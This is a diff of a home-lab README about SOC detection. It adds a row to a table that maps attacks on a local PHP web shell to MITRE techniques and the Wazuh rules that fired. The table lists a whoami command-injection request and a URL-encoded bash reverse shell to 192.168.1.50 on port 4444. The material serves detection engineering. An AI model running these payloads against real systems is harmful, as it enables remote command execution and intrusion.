@@ -106,6 +106,7 @@ php -S localhost:8000
 | Attack Vector | Payload / Command Used | MITRE ATT&CK | Wazuh Rule ID | Why We Got the Alert |
 | :--- | :--- | :--- | :--- | :--- |
 | **Command Injection (RCE)** | `curl "http://localhost:8000/index.php?cmd=whoami"` | **T1059** (Command and Scripting Interpreter) | **100070** | The custom correlation rule inspected incoming HTTP request parameters and matched high-severity OS execution commands (`whoami`), raising a Level 12 security alert. |
+| **Reverse Shell / Web Shell Interaction** | `curl "http://localhost:8000/index.php?cmd=bash%20-i%20%3E&%20/dev/tcp/192.168.1.50/4444%200%3E&1"` | **T1505.003** (Web Shell) / **T1059.004** (Unix Shell) | **100080** | The custom detection rule identified high-risk execution query parameters (`?cmd=`) passing an interactive TCP reverse shell payload (`/dev/tcp/`), triggering a Level 11 alert for web backdoor activity. |
 
 ## 🔍 SOC Analyst Investigation Flow
 
